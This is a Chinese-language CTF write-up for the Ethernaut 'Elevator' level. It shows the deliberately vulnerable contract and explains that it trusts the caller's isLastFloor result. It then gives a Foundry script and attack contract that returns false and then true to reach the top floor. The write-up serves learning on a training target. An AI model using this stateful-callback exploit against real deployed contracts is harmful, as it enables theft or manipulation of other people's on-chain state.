# Ethernaut CTF Writeup

## Level 11 Elevator

> 題目: https://ethernaut.openzeppelin.com/level/0xd8630853340e23CeD1bb87a760e2BaF095fb4009

原始碼:
```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Building {
    function isLastFloor(uint256) external returns (bool);
}

contract Elevator {
    bool public top;
    uint256 public floor;

    function goTo(uint256 _floor) public {
        Building building = Building(msg.sender);

        if (!building.isLastFloor(_floor)) {
            floor = _floor;
            top = building.isLastFloor(floor);
        }
    }
}
```

過關條件: 

- 到達頂樓 (`contract.top() == true`)

解法：

- 這次問題需利用外部合約交叉干擾條件判斷來完成任務
- `Elevator` 合約使用 `Building` 外部接口來檢查是否到達最後一層樓 `isLastFloor` ，可以藉由控制 `isLastFloor` 回傳值來欺騙 `Elevator` 合約，使其認為尚未達到最後一層，然後在再次呼叫時告訴合約已經到達最後一層

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import {Building,Elevator} from "../src/level11/Elevator.sol";

contract ElevatorAttack is Building {
    bool public switchFlipped = false; // 用於控制回傳值

    Elevator public elevator;

    constructor(address _elevatorAddress) {
        elevator = Elevator(_elevatorAddress);
    }

    function isLastFloor(uint256) public returns (bool) {
        // first call
        if (! switchFlipped) {
            switchFlipped = true;
            return false;
        // second call
        } else {
            switchFlipped = false;
            return true;
        }
    }

    function attack() public {
        elevator.goTo(1);
    }
}

contract Attack is Script {
    function run() public {
        vm.startBroadcast();

        // attack contract
        ElevatorAttack attack = new ElevatorAttack(0xfe3D593c0c6fD22f91cAb1bd8E41453BeF01d0d5);
        attack.attack();

        vm.stopBroadcast();
    }
}

```